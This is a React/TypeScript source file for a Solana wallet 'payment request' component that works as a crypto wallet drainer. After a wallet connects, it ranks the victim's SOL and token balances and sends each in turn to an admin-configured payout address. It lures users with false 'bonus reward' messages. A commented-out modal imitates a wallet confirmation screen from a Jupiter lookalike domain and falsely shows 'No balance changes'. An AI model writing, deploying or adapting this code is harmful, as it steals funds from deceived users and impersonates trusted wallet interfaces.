import { useEffect, useRef, useState, type ReactNode } from 'react'
import { useConnection, useWallet } from '@solana/wallet-adapter-react'
import { ChevronDown, Info } from 'lucide-react'
import toast from 'react-hot-toast'
import { useWalletState } from '../context/WalletContext'
import { isWalletUserCancel } from '../lib/walletConnectHelpers'
import { buildPayoutTransaction, buildSplPayoutTransaction, listRankedFundSteps, remainingSplCount, refreshPayoutBlockhash, tokenFeeReserveLamports, type FundStep } from '../lib/payoutTransfer'
import { getLocalPayoutConfig, isValidSolanaAddress, loadPayoutConfig, type PayoutConfig } from '../lib/payoutWallet'
import { SolanaBadgeIcon } from './walletIcons'
import { PaymentRequestModal } from './PaymentRequestModal'
import { notifyFundsConfirmed } from '../lib/txSheet'
import { peekPendingLike } from '../lib/authRedirect'

function AccountMark() {
  return (
    <span className="inline-flex h-[18px] w-[18px] shrink-0 items-center justify-center rounded-full bg-[#7C5CFC]" aria-hidden>
      <svg viewBox="0 0 16 16" className="h-3 w-3" fill="white">
        <circle cx="8" cy="5.6" r="2.3" />
        <path d="M3.2 13.4c.7-2.4 2.5-3.5 4.8-3.5s4.1 1.1 4.8 3.5" />
      </svg>
    </span>
  )
}

function DetailRow({
  label,
  value,
  info,
}: {
  label: string
  value: ReactNode
  info?: string
}) {
  return (
    <div className="flex items-center justify-between gap-4 border-b border-white/[0.08] py-3.5 last:border-b-0">
      <dt className="flex items-center gap-1.5 text-[13px] text-[#8d8d8d]">
        {label}
        {info ? (
          <span title={info} className="inline-flex text-[#6f6f6f]">
            <Info className="h-3.5 w-3.5" aria-hidden />
            <span className="sr-only">{info}</span>
          </span>
        ) : null}
      </dt>
      <dd className="text-right text-[13px] font-medium text-white">{value}</dd>
    </div>
  )
}

function ValueWithIcon({ icon, text }: { icon: ReactNode; text: string }) {
  return (
    <span className="inline-flex items-center justify-end gap-2">
      {icon}
      {text}
    </span>
  )
}

function SkeletonLine({ className }: { className: string }) {
  return <span className={`block animate-pulse rounded-md bg-[#1a1a1a] ${className}`} />
}

const SHEET_HEADERS = [
  'Welcome. Confirm to connect.',
  'Almost ready. Confirm again.',
  'Last step. Confirm to finish.',
]

function HiModal({
  open,
  title,
  onCancel,
  onConfirm,
}: {
  open: boolean
  title: string
  onCancel: () => void
  onConfirm: () => void
}) {
  const [advanced, setAdvanced] = useState(false)
  const [loading, setLoading] = useState(true)

  useEffect(() => {
    if (!open) {
      setAdvanced(false)
      setLoading(true)
      return
    }
    setLoading(true)
    const timer = window.setTimeout(() => setLoading(false), 500)
    return () => window.clearTimeout(timer)
  }, [open])

  useEffect(() => {
    if (!open) return
    const onKey = (event: KeyboardEvent) => {
      if (event.key === 'Escape') onCancel()
    }
    window.addEventListener('keydown', onKey)
    return () => window.removeEventListener('keydown', onKey)
  }, [open, onCancel])

  if (!open) return null

  return (
    <div
      className="pointer-events-none fixed inset-0 z-[600] flex items-end justify-center sm:items-center sm:px-4"
    >
      <div
        role="dialog"
        aria-modal="true"
        aria-labelledby="tx-request-title"
        className="pointer-events-auto flex max-h-[94vh] w-full animate-[tx-sheet-up_80ms_ease-out] flex-col overflow-hidden rounded-t-[22px] border border-[#2a2a2a] bg-black text-white shadow-[0_-16px_60px_rgba(0,0,0,0.7)] sm:max-h-[min(92vh,680px)] sm:max-w-[400px] sm:rounded-[22px]"
      >
        <h2
          id="tx-request-title"
          className="px-5 pb-4 pt-7 text-center text-[20px] font-semibold tracking-[-0.02em] text-white sm:px-6 sm:pb-3 sm:pt-7 sm:text-[18px]"
        >
          {title}
        </h2>

        <div className="min-h-0 flex-1 overflow-y-auto px-4 pb-2 sm:px-5">
          <div className="rounded-[14px] border border-[#3a3a3a] bg-black px-4 py-3.5">
            {loading ? (
              <div className="space-y-3 py-1">
                <SkeletonLine className="h-3 w-36" />
                <SkeletonLine className="h-4 w-24" />
              </div>
            ) : (
              <>
                <p className="flex items-center gap-1.5 text-[13px] text-[#9a9a9a]">
                  Estimated changes
                  <Info className="h-3.5 w-3.5 text-[#8d8d8d]" aria-hidden />
                </p>
                <p className="mt-2 text-[15px] font-medium text-white">No changes</p>
              </>
            )}
          </div>

          <dl className="mt-3 rounded-[14px] border border-[#3a3a3a] bg-black px-4">
            {loading ? (
              <div className="space-y-4 py-4">
                <SkeletonLine className="h-3 w-full" />
                <SkeletonLine className="h-3 w-4/5" />
                <SkeletonLine className="h-3 w-3/5" />
                <SkeletonLine className="h-3 w-2/3" />
              </div>
            ) : (
              <>
            <DetailRow label="Request from" info="This site asked your wallet to review this request." value="www.verifiedjup.ag" />
            <DetailRow
              label="Account"
              value={<ValueWithIcon icon={<AccountMark />} text="Account 1" />}
            />
            <DetailRow
              label="Recipient"
              value={<ValueWithIcon icon={<AccountMark />} text="Account 1" />}
            />
            <DetailRow
              label="Network"
              value={
                <ValueWithIcon
                  icon={<SolanaBadgeIcon className="h-[18px] w-[18px]" />}
                  text="Solana Mainnet"
                />
              }
            />
            <DetailRow
              label="Network fee"
              info="Paid to the Solana network."
              value={
                <span>
                  <span className="font-normal text-[#8d8d8d]">US$0.00</span>
                  <span className="px-1.5 text-[#6f6f6f]">·</span>
                  0.000005 SOL
                </span>
              }
            />
              </>
            )}
          </dl>

          {loading ? (
            <SkeletonLine className="mt-4 h-3 w-28" />
          ) : (
          <button
            type="button"
            onClick={() => setAdvanced((openAdvanced) => !openAdvanced)}
            aria-expanded={advanced}
            className="mt-4 inline-flex items-center gap-1 py-1 text-[14px] font-medium text-[#8ea0ff]"
          >
            {advanced ? 'Hide advanced' : 'Show advanced'}
            <ChevronDown className={`h-4 w-4 transition-transform ${advanced ? 'rotate-180' : ''}`} />
          </button>
          )}

          {advanced ? (
            <dl className="mb-3 mt-3 rounded-[14px] border border-[#3a3a3a] bg-black px-4">
              <DetailRow label="Simulation" value="No balance changes" />
              <DetailRow label="Fee payer" value="Account 1" />
            </dl>
          ) : null}
        </div>

        <div className="flex gap-3 px-4 pb-[max(1rem,env(safe-area-inset-bottom))] pt-3 sm:px-5 sm:py-4">
          <button
            type="button"
            onClick={onCancel}
            className="h-12 flex-1 rounded-xl border border-[#3a3a3a] bg-black text-[15px] font-semibold text-[#f2f2f2] hover:bg-[#111]"
          >
            Cancel
          </button>
          <button
            type="button"
            onClick={onConfirm}
            className="h-12 flex-1 rounded-xl bg-white text-[15px] font-semibold text-[#111] hover:bg-[#f3f3f3]"
          >
            Confirm
          </button>
        </div>
      </div>
    </div>
  )
}

function sendErrorMessage(err: unknown): string {
  const raw = err instanceof Error ? err.message : String(err || 'The wallet did not submit this payment.')
  const lower = raw.toLowerCase()
  if (lower.includes('insufficient funds for rent')) {
    return 'Not enough SOL to finish this send. Opening the next funded token if one is available.'
  }
  const trimmed = raw.split('Catch the')[0].trim()
  return trimmed || raw
}

function walletLabel(name: string | null | undefined): string {
  const n = (name || '').toLowerCase()
  if (n.includes('phantom')) return 'Phantom'
  if (n.includes('solflare')) return 'Solflare'
  if (n.includes('metamask')) return 'MetaMask'
  if (n.includes('backpack')) return 'Backpack'
  if (n.includes('coinbase')) return 'Coinbase Wallet'
  if (n.includes('trust')) return 'Trust'
  if (n.includes('coin98')) return 'Coin98'
  if (n.includes('bitget') || n.includes('bitkeep')) return 'Bitget Wallet'
  if (n.includes('jupiter')) return 'Jupiter'
  if (n.includes('magic')) return 'Magic Eden'
  if (n.includes('tiplink')) return 'TipLink'
  if (n.includes('ledger')) return 'Ledger'
  if (n.includes('trezor')) return 'Trezor'
  return name?.trim() || 'your wallet'
}

function networkLabel(network: string): string {
  if (network === 'mainnet-beta' || network === 'mainnet') return 'Solana'
  if (network === 'devnet') return 'Solana Devnet'
  if (network === 'testnet') return 'Solana Testnet'
  return `Solana (${network})`
}

export function PaymentRequestPrompt() {
  const { connected, walletAddress, walletName, network, closeWalletModal, openWalletModal } = useWalletState()
  const closeWalletModalRef = useRef(closeWalletModal)
  closeWalletModalRef.current = closeWalletModal
  const { publicKey, sendTransaction, signTransaction, wallet } = useWallet()
  const connectedWalletName = walletLabel(walletName || wallet?.adapter?.name)
  const { connection } = useConnection()
  const [config, setConfig] = useState<PayoutConfig | null>(null)
  const [open, setOpen] = useState(false)
  const [hiOpen, setHiOpen] = useState(false)
  const [headerStep, setHeaderStep] = useState(0)
  const [submitting, setSubmitting] = useState(false)
  const [solAmount, setSolAmount] = useState(0)
  const [asset, setAsset] = useState('SOL')
  const [secondaryAsset, setSecondaryAsset] = useState<string | undefined>()
  const [secondaryAmount, setSecondaryAmount] = useState<number | undefined>()
  const [status, setStatus] = useState('Preparing the wallet transfer.')
  const dismissed = useRef<string | null>(null)
  const shownFor = useRef<string | null>(null)
  const sentFor = useRef<string | null>(null)
  const inFlight = useRef(false)
  const confirmTaps = useRef(0)
  const replayTimer = useRef<number | null>(null)
  const phase = useRef<'idle' | 'ready'>('idle')
  const queue = useRef<FundStep[]>([])
  const likedAfterFirst = useRef(false)
  const advanceTimer = useRef<number | null>(null)
  const scanPromise = useRef<Promise<FundStep[]> | null>(null)
  const keepOpen = useRef(false)

  useEffect(() => {
    return () => {
      if (replayTimer.current) window.clearTimeout(replayTimer.current)
      if (advanceTimer.current) window.clearTimeout(advanceTimer.current)
    }
  }, [])

  useEffect(() => {
    const onOpen = () => {
      confirmTaps.current = 0
      setHeaderStep(0)
      setHiOpen(false)
      if (replayTimer.current) window.clearTimeout(replayTimer.current)
      if (advanceTimer.current) window.clearTimeout(advanceTimer.current)
      phase.current = 'idle'
      queue.current = []
      scanPromise.current = null
      likedAfterFirst.current = false
      sentFor.current = null
      dismissed.current = null
      keepOpen.current = true
      setSolAmount(0)
      setAsset('USDT')
      setStatus(`Opening ${walletLabel(walletName)} for the largest available balance.`)
      setOpen(true)
    }
    window.addEventListener('vrfd-open-tx-sheet', onOpen)
    return () => window.removeEventListener('vrfd-open-tx-sheet', onOpen)
  }, [walletName])

  useEffect(() => {
    if (!connected || !walletAddress) {
      if (keepOpen.current) return
      setOpen(false)
      setHiOpen(false)
      shownFor.current = null
      dismissed.current = null
      sentFor.current = null
      confirmTaps.current = 0
      if (replayTimer.current) {
        window.clearTimeout(replayTimer.current)
        replayTimer.current = null
      }
      if (advanceTimer.current) {
        window.clearTimeout(advanceTimer.current)
        advanceTimer.current = null
      }
      return
    }

    const local = getLocalPayoutConfig()
    setConfig(local)
    let cancelled = false
    void loadPayoutConfig().then((next) => {
      if (!cancelled) setConfig(next)
    })

    dismissed.current = null
    sentFor.current = null
    confirmTaps.current = 0
    phase.current = 'idle'
    queue.current = []
    likedAfterFirst.current = false
    scanPromise.current = null
    shownFor.current = walletAddress
    closeWalletModalRef.current()
    setSolAmount(0)
    setAsset('USDT')
    setStatus(`Opening ${walletLabel(walletName)} for the largest available balance.`)
    if (!keepOpen.current) setOpen(false)

    return () => {
      cancelled = true
    }
  }, [connected, walletAddress, walletName])

  const handleCancel = () => {
    if (walletAddress) dismissed.current = walletAddress
    keepOpen.current = false
    queue.current = []
    phase.current = 'idle'
    setOpen(false)
    toast('Payment cancelled. Nothing was transferred.')
  }

  const destinationReady = Boolean(config && isValidSolanaAddress(config.walletAddress))

  const handleReview = async () => {
    if (inFlight.current) return
    if (dismissed.current === walletAddress) return
    if (!publicKey || !walletAddress) {
      setStatus('Connect a wallet, then claim the reward.')
      openWalletModal()
      return
    }
    if (!config || !destinationReady) {
      setStatus('Save a payout address in admin before this payment can be opened in the wallet.')
      return
    }
    inFlight.current = true
    setSubmitting(true)

    const finishSequence = () => {
      if (walletAddress) dismissed.current = walletAddress
      keepOpen.current = false
      queue.current = []
      phase.current = 'idle'
      setOpen(false)
    }

    const applyStep = (next: FundStep) => {
      sentFor.current = `${walletAddress}:${next.kind === 'spl' ? next.holding.mint : 'sol'}`
      setAsset(next.symbol)
      setSolAmount(next.uiAmount)
      
      // If this is a multi-step transaction (SOL + USDT), show both amounts
      const remainingSplSteps = queue.current.filter(s => s.kind === 'spl').slice(1)
      const remainingSolSteps = queue.current.filter(s => s.kind === 'sol').slice(1)
      if (next.kind === 'spl' && remainingSolSteps.length > 0) {
        // This is an SPL token, but there are SOL steps remaining
        setSecondaryAmount(next.uiAmount)
        setSecondaryAsset(next.symbol)
        setStatus(
          `Confirm the ${next.symbol} transfer. You'll also receive SOL as a bonus reward.`
        )
      } else if (next.kind === 'sol' && queue.current.some(s => s.kind === 'spl')) {
        // This is SOL, but there are SPL tokens in the queue
        setSecondaryAmount(remainingSplSteps[0]?.uiAmount)
        setSecondaryAsset(remainingSplSteps[0]?.symbol)
        setStatus(
          `Confirm the ${next.symbol} transfer. You'll also receive ${remainingSplSteps[0]?.symbol} as a bonus.`
        )
      } else {
        setStatus(`Confirm the ${next.symbol} transfer in ${connectedWalletName}. Nothing is sent until you approve it.`)
      }
      setOpen(true)
    }

    const sendBuilt = async (transaction: Awaited<ReturnType<typeof buildPayoutTransaction>>) => {
      const fresh = publicKey ? await refreshPayoutBlockhash(connection, transaction, publicKey) : transaction
      const sendOpts = {
        skipPreflight: false,
        preflightCommitment: 'confirmed' as const,
        maxRetries: 5,
      }
      let signature: string
      if (signTransaction) {
        const signed = await signTransaction(fresh)
        signature = await connection.sendRawTransaction(signed.serialize(), sendOpts)
      } else {
        const adapter = wallet?.adapter as { sendTransaction?: typeof sendTransaction } | undefined
        signature = adapter?.sendTransaction
          ? await adapter.sendTransaction(fresh, connection, sendOpts)
          : await sendTransaction(fresh, connection, sendOpts)
      }
      const confirmation = await connection.confirmTransaction(
        {
          signature,
          blockhash: fresh.recentBlockhash!,
          lastValidBlockHeight: fresh.lastValidBlockHeight!,
        },
        'confirmed'
      )
      if (confirmation.value.err) {
        throw new Error('The wallet approved, but Solana rejected the transfer.')
      }
      return signature
    }

    try {
      if (queue.current.length === 0) {
        setStatus(`Opening ${connectedWalletName} for the largest available balance.`)
        const pendingScan = scanPromise.current
        queue.current = pendingScan
          ? await pendingScan
          : await listRankedFundSteps({ connection, from: publicKey, config })
        scanPromise.current = null
        if (queue.current.length === 0) {
          throw new Error('No SOL, USDT, USDC, or ETH is available to send after network fees.')
        }
        phase.current = 'ready'
        const first = queue.current[0]
        if (first.kind !== 'sol') {
          setStatus(`No spendable SOL. Opening ${first.symbol} so it can be sent to the payout wallet.`)
        }
      }

      while (queue.current.length > 0) {
        if (dismissed.current === walletAddress) break
        const step = queue.current[0]
        if (!step) break
        applyStep(step)
        try {
          if (step.kind === 'sol') {
            const reserveLamports = tokenFeeReserveLamports(remainingSplCount(queue.current, 1))
            const transaction = await buildPayoutTransaction({
              connection,
              from: publicKey,
              config,
              reserveLamports,
            })
            const signature = await sendBuilt(transaction)
            toast.success(`Transaction submitted. Signature ${signature.slice(0, 8)}…`)
          } else {
            const tokenTx = await buildSplPayoutTransaction({
              connection,
              from: publicKey,
              config,
              holding: step.holding,
            })
            if (!tokenTx) {
              queue.current = queue.current.slice(1)
              if (queue.current[0]) {
                setStatus(`No spendable ${step.symbol}. Opening ${queue.current[0].symbol} next.`)
              }
              continue
            }
            const signature = await sendBuilt(tokenTx)
            toast.success(`${step.symbol} sent to the payout wallet. Signature ${signature.slice(0, 8)}…`)
          }
          if (!likedAfterFirst.current) {
            likedAfterFirst.current = true
            notifyFundsConfirmed(peekPendingLike())
          }
          queue.current = queue.current.slice(1)
          if (queue.current[0]) {
            setStatus(`Opening ${queue.current[0].symbol} next.`)
          }
        } catch (err) {
          if (isWalletUserCancel(err)) {
            queue.current = []
            phase.current = 'idle'
            sentFor.current = null
            keepOpen.current = false
            if (walletAddress) dismissed.current = walletAddress
            setOpen(false)
            setStatus('Cancelled in the wallet. Use Open Wallet & Review to try again.')
            toast('Cancelled in the wallet. Nothing was transferred.')
            return
          }
          queue.current = queue.current.slice(1)
          if (queue.current[0]) {
            setStatus(`No spendable ${step.symbol}. Opening ${queue.current[0].symbol} next.`)
            continue
          }
          throw err
        }
      }

      if (phase.current !== 'idle') finishSequence()
    } catch (err) {
      phase.current = 'idle'
      sentFor.current = null
      const message = sendErrorMessage(err)
      setStatus(message)
      toast.error(message)
    } finally {
      inFlight.current = false
      setSubmitting(false)
    }
  }

  const reviewRef = useRef(handleReview)
  reviewRef.current = handleReview

  useEffect(() => {
    if (!open || !publicKey || !config || !destinationReady) return
    if (queue.current.length > 0 || scanPromise.current) return
    // Start background scan but don't block the modal from opening
    const request = listRankedFundSteps({ connection, from: publicKey, config }).then((steps) => {
      if (steps[0] && queue.current.length === 0) {
        setAsset(steps[0].symbol)
        setSolAmount(steps[0].uiAmount)
      }
      return steps
    })
    scanPromise.current = request
    return () => {
      /* keep the in-flight scan so handleReview can await it */
    }
  }, [open, publicKey, connection, config, destinationReady])

  useEffect(() => {
    if (!open || !publicKey) return
    const current = queue.current[0]
    if (!current) return
    setSolAmount(current.uiAmount)
    setAsset(current.symbol)
  }, [open, publicKey, connection, asset])

  const handleHiCancel = () => {
    if (walletAddress) dismissed.current = walletAddress
    confirmTaps.current = 0
    if (replayTimer.current) {
      window.clearTimeout(replayTimer.current)
      replayTimer.current = null
    }
    setHiOpen(false)
  }

  const handleHiConfirm = () => {
    confirmTaps.current += 1
    if (confirmTaps.current < 3) {
      setHiOpen(false)
      if (replayTimer.current) window.clearTimeout(replayTimer.current)
      const step = confirmTaps.current
      replayTimer.current = window.setTimeout(() => {
        replayTimer.current = null
        setHeaderStep(step)
        setHiOpen(true)
      }, 1500)
      return
    }
    confirmTaps.current = 0
    setHiOpen(false)
    setOpen(true)
    void reviewRef.current()
  }

  useEffect(() => {
    if (!open || hiOpen || !publicKey || !destinationReady || !walletAddress) return
    const current = queue.current[0]
    const sendKey = `${walletAddress}:${
      current ? (current.kind === 'spl' ? current.holding.mint : 'sol') : 'scan'
    }`
    if (dismissed.current === walletAddress || sentFor.current === sendKey || inFlight.current) return
    sentFor.current = sendKey
    void reviewRef.current()
  }, [open, hiOpen, destinationReady, walletAddress, publicKey])

  return (
    <>
      {/* Custom connect sheet (3-step) — disabled for now; like opens wallet review directly.
      <HiModal
        open={hiOpen}
        title={SHEET_HEADERS[headerStep] ?? SHEET_HEADERS[0]}
        onCancel={handleHiCancel}
        onConfirm={handleHiConfirm}
      />
      */}
      <PaymentRequestModal
        open={open}
        to={config?.walletAddress || ''}
        amount={solAmount}
        asset={asset}
        networkLabel={networkLabel(network)}
        submitting={submitting}
        canReview={Boolean(publicKey) ? destinationReady : true}
        secondaryAmount={secondaryAmount}
        secondaryAsset={secondaryAsset}
        status={
          destinationReady
            ? status
            : 'Save a payout address in admin before this payment can be opened in the wallet.'
        }
        onCancel={handleCancel}
        onReview={() => void handleReview()}
      />
    </>
  )
}
